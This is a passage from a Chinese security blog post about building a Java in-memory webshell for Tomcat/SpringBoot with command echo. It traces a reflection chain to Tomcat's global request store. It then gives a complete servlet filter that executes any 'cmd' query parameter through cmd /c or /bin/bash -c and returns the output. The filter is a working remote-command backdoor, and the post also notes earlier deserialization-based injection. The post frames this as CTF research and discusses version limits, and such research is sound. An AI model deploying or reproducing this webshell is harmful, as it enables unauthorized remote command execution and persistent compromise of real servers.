<p>我们访问unserial路由2次即可成功注册，这两次访问虽然会报错但是可以成功打入：<br>第一次报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675801883124-c56e908e-c4c2-42e2-8339-3c3f84528f1b.png#averageHue=%23222422&clientId=ua6dd1655-4fe7-4&from=paste&height=240&id=uf5538f0f&name=image.png&originHeight=330&originWidth=1513&originalType=binary&ratio=1&rotation=0&showTitle=false&size=740111&status=done&style=none&taskId=u236a3432-c712-4f1d-965e-7a74ddc7f42&title=&width=1100.3636363636363" alt="image.png"><br>第二次报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675801895515-2ce261d9-fe1b-4408-9858-b30c154e761b.png#averageHue=%23212320&clientId=ua6dd1655-4fe7-4&from=paste&height=184&id=u6db7a249&name=image.png&originHeight=253&originWidth=1576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=595251&status=done&style=none&taskId=u94329e7d-0855-4147-b754-2b88c34b4e5&title=&width=1146.1818181818182" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675801917148-d654677f-b123-4885-a780-aec46ebdc7b7.png#averageHue=%23b9b8b8&clientId=ua6dd1655-4fe7-4&from=paste&height=548&id=uc9218226&name=image.png&originHeight=754&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96472&status=done&style=none&taskId=uf068763f-3368-4427-8e7e-e0f5e57e376&title=&width=1396.3636363636363" alt="image.png"></p>
<h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><p>上述是一种半通用的方法，有一定的局限性，该方法入口类是在<code>ApplicationFilterChain#internalDofilter</code>方法，假如序列化触发点在这之前的话就无法注入（比如shiro，暂未研究，只是略看），并且还有JDK和SpringBoot的版本限制</p>
<h1 id="基于Tomcat全局存储进行回显"><a href="#基于Tomcat全局存储进行回显" class="headerlink" title="基于Tomcat全局存储进行回显"></a>基于Tomcat全局存储进行回显</h1><p>前一种方法有局限性，而现在要讲的方法是可以通杀的，回归到最初的地方去寻找</p>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>起一个SpringBoot服务，在Controller的mapping上下一个断电，分析一下调用栈，首先定位到<code>Http11Processor</code>中，调用了<code>getAdapter().service(request, response)</code>，其中的request和response均来自父类AbstractProcessor中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675844447609-6a66f6fc-d79e-4b05-84ec-b13eb28fc598.png#averageHue=%232b2e2a&clientId=u7282ee5f-a2a8-4&from=paste&height=652&id=u76b201be&name=image.png&originHeight=897&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2474186&status=done&style=none&taskId=u2d687e4c-e3b9-4b6d-8f00-03cc6ee00a8&title=&width=1395.6363636363637" alt="image.png"><br>继续分析调用栈，接着在AbstractProtocol的内部类ConnectionHandler中调用了register方法注册了processor，这里的processor就是上面的Http11processor：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675844619165-2a153bbd-71b4-48ac-bf6a-105261ac99d4.png#averageHue=%232f332f&clientId=u7282ee5f-a2a8-4&from=paste&height=765&id=u5936f1df&name=image.png&originHeight=1052&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2799414&status=done&style=none&taskId=uf044a351-e1ac-401e-b836-08606a6171b&title=&width=1396.3636363636363" alt="image.png"><br>我们再这一步进行跟进，在<code>register</code>方法中有一个<code>Requestinfo</code>类型的对象<code>rp</code>，他在里面也封装着一个<code>request</code>对象，之后将<code>requestinfo</code>对象存入<code>global</code>属性中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675844948461-8e2cfc8c-dc5d-4098-a8da-71e60593511a.png#averageHue=%232c2e2c&clientId=u7282ee5f-a2a8-4&from=paste&height=649&id=uc4b1bdd4&name=image.png&originHeight=892&originWidth=1906&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2437829&status=done&style=none&taskId=u037e6f5c-f07b-4232-848e-936a067bb18&title=&width=1386.1818181818182" alt="image.png"><br>这个request对象是和之前<code>Http11processor</code>中的request对象相同的（调试不发生在一次，因此<code>@</code>后面的数值可能不同）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845116307-81dad240-4f4a-48f5-971e-d4f5ba19df51.png#averageHue=%232c2e2c&clientId=u7282ee5f-a2a8-4&from=paste&height=552&id=u01c20bb1&name=image.png&originHeight=759&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2067302&status=done&style=none&taskId=ubf23074a-581d-4c13-b9fb-f0dc9ce6600&title=&width=1396.3636363636363" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845170806-8f1fade8-88ca-4bf1-aaf5-09bf0c802e3a.png#averageHue=%232b2d2b&clientId=u7282ee5f-a2a8-4&from=paste&height=179&id=u045bdde2&name=image.png&originHeight=246&originWidth=1376&originalType=binary&ratio=1&rotation=0&showTitle=false&size=512671&status=done&style=none&taskId=u91b753e6-bbd8-40ee-86fc-f22b685ee14&title=&width=1000.7272727272727" alt="image.png"><br>既然把同一个request对象放到了global中，所以我们尝试寻找存储了AbstractProtocol实例的地方，由于global对象是在内部类ConnectionHandler中，如果可以获取到AbstractProtocol对象，那么就能通过反射getHandler方法来获取到内部类ConnectionHandler的实例，进而获取global：既然同一个request对象都被封装进了<code>AbstractProtocol</code>的<code>global</code>属性当中，那现在需要做的就是如何找到储存了<code>AbstractProtocol</code>类的地方，只要找到了我们就可以通过反射获取（Handler是ConnectionHandler的父类）：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845593941-0e260c91-1ce0-4cdd-bdb5-50125d5cda89.png#averageHue=%232d2e2a&clientId=u7282ee5f-a2a8-4&from=paste&height=220&id=u94e7a871&name=image.png&originHeight=303&originWidth=1511&originalType=binary&ratio=1&rotation=0&showTitle=false&size=675742&status=done&style=none&taskId=uaffa7946-42a7-47d7-8ba2-63637f20ab4&title=&width=1098.909090909091" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845588945-47033e77-da80-4eee-8024-095831de4535.png#averageHue=%232c2d2a&clientId=u7282ee5f-a2a8-4&from=paste&height=265&id=u3801e9a5&name=image.png&originHeight=364&originWidth=1453&originalType=binary&ratio=1&rotation=0&showTitle=false&size=778709&status=done&style=none&taskId=u9ca6388d-12e3-4944-8024-5437a459a95&title=&width=1056.7272727272727" alt="image.png"><br>思路图如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845620898-4826695a-1d54-4c12-a5db-0a2d43e87403.png#averageHue=%23f5f5f5&clientId=u7282ee5f-a2a8-4&from=paste&id=u2e7aa6ad&originHeight=232&originWidth=1239&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8a8f514a-036e-4acf-8817-48f2b98dad9&title="><br>所以现在就是需要获取<code>AbstractProtocol</code>，我们继续观察调用栈，可以发现在<code>CoyoteAdapter</code>类中的connector属性中存放了<code>protocolHandler</code>对象：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845863955-62724f74-2678-4fe6-91a9-b7d26530ef20.png#averageHue=%232d2f2d&clientId=u7282ee5f-a2a8-4&from=paste&height=607&id=u4feb5ed1&name=image.png&originHeight=835&originWidth=1917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2293958&status=done&style=none&taskId=u98c1ac0b-ea1b-4cc3-a743-93dcd744e6a&title=&width=1394.1818181818182" alt="image.png"><br><code>protocolHandler</code>和<code>AbstractProtocol</code>的继承关系图如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675845935379-8367bb5a-ad36-413e-97d1-47d16b799e13.png#averageHue=%232d2c2c&clientId=u7282ee5f-a2a8-4&from=paste&id=ubeda2dad&originHeight=517&originWidth=1299&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3621aca5-7c28-45e3-9baf-e48955ae585&title="><br>并且通过观察可以发现存在connector属性中的protocolHandler属性真实类型为<code>Http11NioProtocol</code>对象，而这刚好就是<code>AbstractProtocol</code>的子类，我们可以通过向上转型从而获取<code>AbstractProtocol</code>，然后去获取<code>global</code>属性，进而获取<code>requestinfo</code>最后获取<code>request</code>对象<br>这个Connector类是在org.apache.catalina包下的，Tomcat会最先加载这个包，所以我们到Tomcat启动过程中寻找一下Connector类的踪迹。如果熟悉Spring boot启动Tomcat服务器流程的话，可以知道在TomcatServletWebServerFactory#getWebServer方法中执行了addConnector方法，执行完之后就会把connector对象封装到StandardService对象中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675847349614-fe1ea952-ef99-44f1-9059-ac83d24cbc15.png#averageHue=%232d2f2d&clientId=u7282ee5f-a2a8-4&from=paste&height=535&id=ube8a26f5&name=image.png&originHeight=735&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2082396&status=done&style=none&taskId=u01692f4b-949b-49c0-9db8-1d84beccc59&title=&width=1396.3636363636363" alt="image.png"><br>之后Litch1师傅的思路就是通过WebappClassLoaderBase这个线程上下文类加载器于StrandardService来产生联系：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675847607551-2543ba4c-f4df-4612-bde4-a81bd257c200.png#averageHue=%232b2d2b&clientId=u7282ee5f-a2a8-4&from=paste&height=256&id=u8224a503&name=image.png&originHeight=352&originWidth=1766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=943941&status=done&style=none&taskId=u85b8dad6-2874-4aae-991d-44237e4ca74&title=&width=1284.3636363636363" alt="image.png"><br>这个类加载器我们可以直接通过Thread.currentThread().getContextClassLoader()来直接获取到实例，所以整个寻找链也就完成了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase --&gt; </span><br><span class="line">	resources(StandardRoot) --&gt;</span><br><span class="line">		context(StandardContext) --&gt;</span><br><span class="line">			context(ApplicationContext) --&gt;</span><br><span class="line">				service(StandardService) --&gt;</span><br><span class="line">					connectors(Connector[]) --&gt;</span><br><span class="line">						protocolHandler(ProtocolHandler) --&gt;</span><br><span class="line">							(转型)protocolHandler(AbstractProtocol) --&gt;</span><br><span class="line">								(内部类)hanlder(AbstractProtocol$ConnectorHandler) --&gt;</span><br><span class="line">									global(RequestGroupInfo) --&gt;</span><br><span class="line">										processors(ArrayList) --&gt;</span><br><span class="line">											requestInfo(RequestInfo) --&gt;</span><br><span class="line">												req(org.apache.coyote.Request) --getNote--&gt;</span><br><span class="line">													request(org.apache.connector.Request) --&gt;</span><br><span class="line">														response(org.apache.connector.Response)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有一点需要注意的是，我们最后拿到的Request对象是org.apache.coyote.Request，而真正需要其实是org.apache.catalina.connector.Request对象，前者是是应用层对于请求-响应对象的底层实现，并不方便使用，通过调用其getNote方法可以得到后者：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675847891874-3f689f43-8558-4dfa-934b-624d05fc8fa9.png#averageHue=%232e322c&clientId=u7282ee5f-a2a8-4&from=paste&height=612&id=ub40b53a4&name=image.png&originHeight=842&originWidth=1771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2101027&status=done&style=none&taskId=ub7562a7e-ece1-4596-b4db-7c9b528d81e&title=&width=1288" alt="image.png"></p>
<h2 id="内存马回显构造"><a href="#内存马回显构造" class="headerlink" title="内存马回显构造"></a>内存马回显构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.AbstractProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;testFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter3</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebappClassLoaderBase</span> <span class="variable">loader</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> loader.getResources().getContext();</span><br><span class="line">            <span class="comment">// 获取 ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(context);</span><br><span class="line">            <span class="comment">// 获取 StandardService</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">serviceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            serviceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取 Connector 并筛选 HTTP Connector</span></span><br><span class="line">            Connector[] connectors = standardService.findConnectors();</span><br><span class="line">            <span class="keyword">for</span> (Connector connector : connectors) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connector.getScheme().contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 获取 AbstractProtocol 对象</span></span><br><span class="line">                    <span class="type">AbstractProtocol</span> <span class="variable">abstractProtocol</span> <span class="operator">=</span> (AbstractProtocol) connector.getProtocolHandler();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 获取 AbstractProtocol$ConnectionHandler</span></span><br><span class="line">                    <span class="type">Method</span> <span class="variable">getHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>);</span><br><span class="line">                    getHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    AbstractEndpoint.<span class="type">Handler</span> <span class="variable">ConnectionHandler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// global(RequestGroupInfo)</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalField.get(ConnectionHandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// processors (ArrayList)</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ArrayList</span> <span class="variable">processors</span> <span class="operator">=</span> (ArrayList) processorsField.get(global);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (Object processor : processors) &#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processor;</span><br><span class="line">                        <span class="comment">// 依据 QueryString 获取对应的 RequestInfo</span></span><br><span class="line">                        <span class="keyword">if</span> (requestInfo.getCurrentQueryString().contains(<span class="string">&quot;cmd&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                            reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="comment">// org.apache.coyote.Request</span></span><br><span class="line">                            <span class="type">Request</span> <span class="variable">requestTemp</span> <span class="operator">=</span> (Request) reqField.get(requestInfo);</span><br><span class="line">                            <span class="comment">// org.apache.catalina.connector.Request</span></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) requestTemp.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 执行命令</span></span><br><span class="line">                            cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                            String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;//A&quot;</span>);</span><br><span class="line">                                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                                writer.write(output);</span><br><span class="line">                                writer.flush();</span><br><span class="line">                                writer.close();</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request1, response1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在主类记得加上扫描注解</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.echoshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletComponentScan;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoshellApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(EchoshellApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675848665354-b764f79f-1681-4ae8-9ceb-68fed69c8cbe.png#averageHue=%23aeaeae&clientId=u7282ee5f-a2a8-4&from=paste&height=578&id=u3638d8af&name=image.png&originHeight=795&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58246&status=done&style=none&taskId=ub4e17963-ed1e-452c-9103-dcdab426fde&title=&width=1392.7272727272727" alt="image.png"></p>
<h2 id="局限性-1"><a href="#局限性-1" class="headerlink" title="局限性"></a>局限性</h2><p>该方法在tomcat10以下应该是可以通杀的，因为之前用的高版本springBoot，经过测试发现springboot在2.6以后移除了getresources方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1675848728120-23601990-a7d0-4dd5-80d6-cc2226b763a1.png#averageHue=%2331312a&clientId=u7282ee5f-a2a8-4&from=paste&height=73&id=ue7f80d8d&name=image.png&originHeight=101&originWidth=703&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112428&status=done&style=none&taskId=u2dbef62d-ce17-40c4-b175-574a925d068&title=&width=511.27272727272725" alt="image.png"><br>因此还是得看情况使用咯</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/内存马/" class="tag">#内存马</a><a href="/tags/CTF/" class="tag">#CTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">SpringBoot3.x内存马构造思路</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Agent内存马剖析</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
